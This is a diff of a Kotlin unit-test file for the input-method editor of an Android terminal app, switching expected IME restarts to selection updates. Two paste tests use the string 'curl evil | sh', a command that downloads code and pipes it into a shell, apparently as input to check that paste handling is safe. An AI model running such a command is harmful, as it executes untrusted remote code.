@@ -30,6 +30,7 @@ import org.junit.Test
 class ImeEditorTest {
     private val sent = mutableListOf<HostInput>()
     private var restarts = 0
+    private var selectionUpdates = 0
     private val editor =
         ImeEditor(
             object : ImeEditor.Listener {
@@ -39,6 +40,10 @@ class ImeEditorTest {
 
                 override fun restartInput() {
                     restarts++
+                }
+
+                override fun updateSelection() {
+                    selectionUpdates++
                 }
             }
         )
@@ -258,7 +263,8 @@ class ImeEditorTest {
         editor.commitText("ls")
         editor.commitText("\n")
         assertEquals(listOf<HostInput>(text("ls"), enter), sent)
-        assertEquals(1, restarts)
+        assertEquals(1, selectionUpdates)
+        assertEquals(0, restarts)
         assertEquals("", editor.text)
     }
 
@@ -272,10 +278,12 @@ class ImeEditorTest {
         assertEquals("", editor.text)
         // The deletion cannot take back the Enter: it is BS on the new line.
         assertTrue(editor.deleteSurroundingText(1, 0))
+        assertEquals(0, selectionUpdates)
         assertEquals(0, restarts)
         assertFalse(editor.endBatchEdit())
         assertEquals(listOf(enter, delete(1)), sent)
-        assertEquals(1, restarts)
+        assertEquals(1, selectionUpdates)
+        assertEquals(0, restarts)
     }
 
     @Test
@@ -289,9 +297,11 @@ class ImeEditorTest {
         editor.commitText("cd")
         assertFalse(editor.endBatchEdit())
         assertEquals(listOf<HostInput>(text("ab\t"), text("cd")), sent)
-        // What was committed since the reset is dropped by the restart (section 5.2).
+        // What was committed since the reset is dropped when the IME reads the edit buffer
+        // (section 5.2).
         assertEquals("", editor.text)
-        assertEquals(1, restarts)
+        assertEquals(1, selectionUpdates)
+        assertEquals(0, restarts)
     }
 
     @Test
@@ -325,7 +335,8 @@ class ImeEditorTest {
         assertEquals(listOf(text("a"), tab, text("b"), enter), sent)
         assertEquals("", editor.text)
         assertFalse(editor.endBatchEdit())
-        assertEquals(1, restarts)
+        assertEquals(1, selectionUpdates)
+        assertEquals(0, restarts)
     }
 
     @Test
@@ -349,15 +360,14 @@ class ImeEditorTest {
     }
 
     @Test
-    fun aResetDoesNotRestartTheImeIfNothingChangedSinceTheLastRestart() {
+    fun resetsWithoutComposingTextTellTheSelectionAndDoNotRestartTheIme() {
         editor.requestReset()
-        assertEquals(0, restarts)
+        assertEquals(1, selectionUpdates)
         editor.commitText("a")
         editor.requestReset()
-        assertEquals(1, restarts)
         editor.requestReset()
-        editor.requestReset()
-        assertEquals(1, restarts)
+        assertEquals(3, selectionUpdates)
+        assertEquals(0, restarts)
     }
 
     @Test
@@ -376,17 +386,17 @@ class ImeEditorTest {
     }
 
     @Test
-    fun theFirstKeyAfterTypingRestartsTheImeOnce() {
+    fun keysAfterTypingTellTheSelectionWithoutRestartingTheIme() {
         editor.commitText("ab")
         editor.onKeyDown(KeyStroke.Special(TerminalKey.Left))
-        assertEquals(1, restarts)
+        assertEquals(1, selectionUpdates)
         editor.onKeyDown(KeyStroke.Special(TerminalKey.Left))
         editor.onKeyDown(KeyStroke.Special(TerminalKey.Right))
-        assertEquals(1, restarts)
-        // A character key types into the history, so the next key restarts again.
+        assertEquals(3, selectionUpdates)
         editor.onKeyDown(characterKey('c'.code))
         editor.onKeyDown(KeyStroke.Special(TerminalKey.Up))
-        assertEquals(2, restarts)
+        assertEquals(4, selectionUpdates)
+        assertEquals(0, restarts)
     }
 
     @Test
@@ -413,20 +423,21 @@ class ImeEditorTest {
     }
 
     @Test
-    fun aResetRestartsTheImeAfterAnEditThatLeftNothing() {
+    fun aResetAfterClearingComposingTextTellsTheSelectionWithoutRestarting() {
         editor.setComposingText("か")
         editor.setComposingText("")
         editor.requestReset()
-        assertEquals(1, restarts)
+        assertEquals(1, selectionUpdates)
+        assertEquals(0, restarts)
     }
 
     @Test
-    fun callsThatLeaveTheBufferEmptyAfterARestartDoNotMakeAResetRestartTheImeAgain() {
+    fun callsThatLeaveTheBufferEmptyDoNotMakeAResetRestartTheIme() {
         editor.commitText("ab")
         editor.onKeyDown(KeyStroke.Special(TerminalKey.Enter))
-        assertEquals(1, restarts)
+        assertEquals(1, selectionUpdates)
 
-        // Calls that Android or an IME makes right after a restart, which change nothing.
+        // Calls that Android or an IME makes right after a reset, which change nothing.
         editor.finishComposingText()
         assertTrue(editor.setComposingRegion(0, 0))
         editor.beginBatchEdit()
@@ -438,16 +449,18 @@ class ImeEditorTest {
         editor.requestReset()
         editor.requestReset()
 
-        assertEquals(1, restarts)
+        assertEquals(3, selectionUpdates)
+        assertEquals(0, restarts)
         assertEquals(listOf<HostInput>(text("ab"), enter), sent)
     }
 
     @Test
-    fun aCommitThatTheHistoryDoesNotKeepRestartsTheIme() {
-        // The history is reset after a committed HT at once, but the IME has the HT.
+    fun aCommitThatTheHistoryDoesNotKeepTellsTheSelection() {
+        // The history is reset after a committed HT at once, and the IME is told the selection.
         editor.commitText("\t")
         assertEquals("", editor.text)
-        assertEquals(1, restarts)
+        assertEquals(1, selectionUpdates)
+        assertEquals(0, restarts)
     }
 
     @Test
@@ -459,7 +472,8 @@ class ImeEditorTest {
             listOf<HostInput>(text("ab"), HostInput.Paste("echo hi\r\ncurl evil | sh\rx")),
             sent,
         )
-        assertEquals(1, restarts)
+        assertEquals(1, selectionUpdates)
+        assertEquals(0, restarts)
         assertEquals("", editor.text)
     }
 
@@ -467,7 +481,8 @@ class ImeEditorTest {
     fun committedTextWithATrailingNewlineIsAPaste() {
         editor.commitText("curl evil | sh\n")
         assertEquals(listOf<HostInput>(HostInput.Paste("curl evil | sh\n")), sent)
-        assertEquals(1, restarts)
+        assertEquals(1, selectionUpdates)
+        assertEquals(0, restarts)
     }
 
     @Test
@@ -535,7 +550,8 @@ class ImeEditorTest {
         assertTrue(editor.replaceText(4, 5, "\n"))
         assertEquals(listOf<HostInput>(delete(3), HostInput.Paste("\nhi")), sent)
         assertEquals("", editor.text)
-        assertEquals(1, restarts)
+        assertEquals(1, selectionUpdates)
+        assertEquals(0, restarts)
     }
 
     @Test
@@ -591,7 +607,8 @@ class ImeEditorTest {
             sent,
         )
         assertEquals("", editor.text)
-        assertEquals(1, restarts)
+        assertEquals(1, selectionUpdates)
+        assertEquals(0, restarts)
     }
 
     @Test
@@ -616,6 +633,8 @@ class ImeEditorTest {
                         }
 
                         override fun restartInput() {}
+
+                        override fun updateSelection() {}
                     }
                 )
             editor.setComposingText("a\nb")
@@ -635,6 +654,8 @@ class ImeEditorTest {
                     }
 
                     override fun restartInput() {}
+
+                    override fun updateSelection() {}
                 },
                 maxHistoryLength = 3,
             )
@@ -730,7 +751,8 @@ class ImeEditorTest {
         assertEquals(listOf<HostInput>(text("cd Doc\t")), sent)
         // The shell may have completed the word, so the history no longer predicts the line.
         assertEquals("", editor.text)
-        assertEquals(1, restarts)
+        assertEquals(1, selectionUpdates)
+        assertEquals(0, restarts)
         assertFalse(editor.setComposingRegion(3, 7))
         assertEquals(listOf<HostInput>(text("cd Doc\t")), sent)
     }
@@ -772,7 +794,8 @@ class ImeEditorTest {
         editor.commitText("a")
         editor.performEditorAction()
         assertEquals(listOf<HostInput>(text("a"), enter), sent)
-        assertEquals(1, restarts)
+        assertEquals(1, selectionUpdates)
+        assertEquals(0, restarts)
     }
 
     @Test
@@ -864,21 +887,24 @@ class ImeEditorTest {
         assertEquals(listOf<HostInput>(text("ab")), sent)
         // The IME could otherwise correct the text later, after the app armed its modifiers.
         assertEquals("", editor.text)
-        assertEquals(1, restarts)
+        assertEquals(1, selectionUpdates)
         editor.sendPendingInput()
-        assertEquals(1, restarts)
+        assertEquals(2, selectionUpdates)
+        assertEquals(0, restarts)
     }
 
     @Test
-    fun theRestartWaitsForTheCompositionToFinish() {
+    fun theResetWaitsForTheCompositionToFinish() {
         editor.commitText("a")
         editor.setComposingText("か")
         editor.requestReset()
+        assertEquals(0, selectionUpdates)
         assertEquals(0, restarts)
         // The history is reset at once; the composing text stays, since the IME has it.
         assertEquals("か", editor.text)
         editor.finishComposingText()
-        assertEquals(1, restarts)
+        assertEquals(1, selectionUpdates)
+        assertEquals(0, restarts)
         assertEquals("", editor.text)
     }
 
@@ -917,7 +943,8 @@ class ImeEditorTest {
         assertFalse(editor.endBatchEdit())
         // The deletion reaches before the empty history, as BS.
         assertEquals(listOf(text("ab"), delete(1), text("c"), delete(1)), sent)
-        assertEquals(1, restarts)
+        assertEquals(1, selectionUpdates)
+        assertEquals(0, restarts)
     }
 
     @Test
@@ -945,10 +972,12 @@ class ImeEditorTest {
         editor.beginBatchEdit()
         editor.commitText("a")
         editor.requestReset()
+        assertEquals(0, selectionUpdates)
         assertEquals(0, restarts)
         assertFalse(editor.endBatchEdit())
         assertEquals(listOf<HostInput>(text("a")), sent)
-        assertEquals(1, restarts)
+        assertEquals(1, selectionUpdates)
+        assertEquals(0, restarts)
     }
 
     @Test
@@ -961,13 +990,18 @@ class ImeEditorTest {
                     override fun restartInput() {
                         restarts++
                     }
+
+                    override fun updateSelection() {
+                        selectionUpdates++
+                    }
                 },
                 maxHistoryLength = 3,
             )
         small.commitText("abc")
-        assertEquals(0, restarts)
+        assertEquals(0, selectionUpdates)
         small.commitText("d")
-        assertEquals(1, restarts)
+        assertEquals(1, selectionUpdates)
+        assertEquals(0, restarts)
         assertEquals("", small.text)
     }
 
@@ -1009,6 +1043,50 @@ class ImeEditorTest {
         sent.clear()
         editor.finishComposingText()
         assertEquals(listOf(delete(1), text("\ud83d\ude00")), sent)
+    }
+
+    @Test
+    fun aResetTellsTheImeTheSelectionWithoutRestartingIt() {
+        editor.commitText("ab")
+
+        editor.requestReset()
+
+        assertEquals(0, restarts)
+        assertEquals(1, selectionUpdates)
+        assertEquals("", editor.text)
+    }
+
+    @Test
+    fun aResetAfterAKeyCommittedTheComposingTextRestartsTheIme() {
+        editor.setComposingText("か")
+
+        editor.onKeyDown(characterKey('x'.code))
+
+        assertEquals(1, restarts)
+        assertEquals(0, selectionUpdates)
+    }
+
+    @Test
+    fun aResetAfterTheImeFinishedItsCompositionTellsTheSelection() {
+        editor.setComposingText("か")
+        editor.finishComposingText()
+
+        editor.requestReset()
+
+        assertEquals(0, restarts)
+        assertEquals(1, selectionUpdates)
+    }
+
+    @Test
+    fun closingTheConnectionDropsThePendingRestart() {
+        editor.beginBatchEdit()
+        editor.setComposingText("か")
+        editor.onKeyDown(characterKey('x'.code))
+
+        editor.closeConnection()
+
+        assertEquals(0, restarts)
+        assertEquals(1, selectionUpdates)
     }
 }
 
